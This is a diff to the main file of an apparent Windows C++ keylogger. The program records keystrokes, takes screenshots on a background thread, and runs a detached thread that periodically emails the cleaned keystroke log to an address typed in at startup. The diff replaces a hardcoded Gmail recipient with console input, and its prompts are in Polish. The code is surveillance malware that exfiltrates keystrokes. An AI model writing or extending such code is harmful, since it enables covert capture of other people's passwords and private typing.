@@ -6,18 +6,20 @@
 #include "Mail_sender.h"
 
 #include <thread>
+#include <iostream>
 
 
 int main(int argc, char *argv[])
 {
-	int email_send_loop_time = 1;
-	EMail_Sender email("Patry14inf@gmail.com", email_send_loop_time);
-	std::thread email_thread(&EMail_Sender::send_email, email, "e:\\info.txt");
-	email_thread.join();
-
-	return 0;
-	
 	bool saving_enabled = false;
+
+	std::string mail_to;
+	std::cout << "Prosze podac adres e-mail: ";
+	std::cin >> mail_to;
+
+	int email_send_loop_time;
+	std::cout << "Prosze podac co ile minut wysylac e-mail z logami: ";
+	std::cin >> email_send_loop_time;
 
 	std::vector<std::string> keywords = get_keywords();
 
@@ -28,12 +30,16 @@ int main(int argc, char *argv[])
 	Application_History application_history(file_logs, keylogger.get_file_logs_clean_keys(),
 		file_path, saving_enabled);
 
+	EMail_Sender email(mail_to, email_send_loop_time);
+	std::thread email_thread(&EMail_Sender::send_email, email, keylogger.get_path_to_clean_keys());
+	email_thread.detach();
+	
 	// Take screenshots in a separate thread
 	Screenshot screenshoter;
 	std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
 	screenshot_thread.detach();
 
-	Sleep(10); // give other programs time to run
+	//Sleep(10); // give other programs time to run
 
 	while (1)
 	{
